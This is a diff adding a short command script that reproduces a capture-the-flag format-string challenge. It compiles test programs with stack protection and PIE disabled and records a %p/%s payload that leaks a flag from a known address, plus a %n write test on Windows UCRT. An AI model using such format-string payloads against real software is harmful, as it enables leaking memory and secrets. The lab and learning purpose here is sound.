@@ -1,0 +1,7 @@
+# 在仓库根执行；Windows 11 + MinGW gcc 15.2.0 实跑
+gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto05/artifacts/fmt_read.exe Tool/cases/pwn-crypto05/input/fmt_read.c
+gcc -O0 -fno-stack-protector -no-pie -o Tool/cases/pwn-crypto05/artifacts/percent_n.exe Tool/cases/pwn-crypto05/input/percent_n.c
+nm Tool/cases/pwn-crypto05/artifacts/fmt_read.exe > Tool/cases/pwn-crypto05/artifacts/nm.txt
+# 取 secret 地址 0x140003000，payload = b"%p%p%p%p%p%s" + 4 空格 + p64(secret)
+Tool/cases/pwn-crypto05/artifacts/fmt_read.exe   # 管道送入上述 payload，stdout 中泄漏 FLAG{...}
+Tool/cases/pwn-crypto05/artifacts/percent_n.exe  # 输出 x=0，证明 UCRT 下 %n 不写
